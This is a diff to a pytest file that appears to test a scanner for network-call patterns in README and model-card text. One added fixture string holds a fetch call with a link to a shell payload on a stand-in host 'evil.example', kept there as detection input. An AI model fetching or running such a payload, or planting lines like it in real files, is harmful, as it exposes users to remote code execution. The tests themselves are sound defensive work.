@@ -1853,6 +1853,10 @@ def test_documented_issue_label_does_not_open_a_call_around_later_link(tmp_path:
         """client.fetch(  # [#12](https://tracker.example.org/issues/12))
     '[download](https://evil.example/payload.sh)'
 )""",
+        """with client.fetch(#935) before continuing.
+    '[download](https://evil.example/payload.sh)'
+):
+    pass""",
     ],
 )
 def test_html_and_issue_citations_preserve_actual_enclosing_calls(tmp_path: Path, content: str) -> None:
@@ -4570,6 +4574,26 @@ def test_model_card_byline_preserves_documented_post_and_later_shell_destination
         and check.details.get("position") == content.rindex(reference.encode())
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in checks
+    )
+
+
+@pytest.mark.parametrize(
+    ("credit", "reference"),
+    [
+        ("Converted by **Sample Team** - maintainer@publisher.dev", "publisher.dev"),
+        (
+            "Conversion: done by lab with Toolkit (https://github.com/dev-team/toolkit/)",
+            "https://github.com/dev-team/toolkit/",
+        ),
+    ],
+)
+def test_model_card_byline_inside_multiline_call_keeps_warning(tmp_path: Path, credit: str, reference: str) -> None:
+    content = f'~~~python\nfetch("""\n\n{credit}\n""".split()[-1])\n~~~\n'
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("position") == content.index(reference)
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(result)
     )
 
 
